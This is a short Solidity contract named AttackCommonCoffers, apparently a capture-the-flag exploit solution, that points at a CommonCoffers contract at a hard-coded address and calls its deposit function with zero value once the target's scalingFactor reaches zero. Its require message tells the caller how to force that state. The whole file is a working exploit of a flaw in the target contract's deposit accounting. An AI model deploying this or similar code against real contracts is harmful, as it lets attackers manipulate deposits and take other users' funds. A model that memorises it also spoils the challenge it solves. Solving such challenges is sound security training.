// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./CommonCoffers.sol";

contract AttackCommonCoffers {
    address CommonCoffersAddress = 0x9C22ce44f598cf5616c28a25b3514a1f293B3919;
    CommonCoffers c = CommonCoffers(CommonCoffersAddress);

    function attack() public {
        require(
            c.scalingFactor() == 0,
            "scalingFactor > 0 send value > contract balance for successful attack"
        );
        c.deposit{value: 0}(address(this));
    }

    function getScalingFactor() public view returns (uint256) {
        return c.scalingFactor();
    }
}
